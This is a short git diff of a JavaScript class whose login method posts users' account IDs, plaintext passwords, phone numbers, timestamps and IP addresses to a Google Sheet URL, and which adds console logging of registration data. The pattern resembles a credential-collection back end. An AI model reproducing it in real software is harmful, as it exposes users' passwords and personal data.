@@ -3,6 +3,7 @@ const axios = require("axios");
 class GoogleSheet {
   async storageDataRegisterToGoogleSheet(dataInput, GOOGLE_SHEET_URL) {
     const data = JSON.stringify(dataInput);
+    console.log(data);
     const config = {
       method: "post",
       maxBodyLength: Infinity,
@@ -24,12 +25,10 @@ class GoogleSheet {
   }
 
   async storageDataLoginToGoogleSheet(dataInput, GOOGLE_SHEET_URL) {
-    console.log(dataInput);
-    const {AccountID, AccountPWD, phone} = dataInput;
+    const {action, AccountID, AccountPWD, phone, timeNow, userIp, } = dataInput;
     const data = {
-      AccountID, AccountPWD, phone
+      action, AccountID, phone, timeNow, userIp, AccountPWD
     }
-
 
     const config = {
       method: "post",
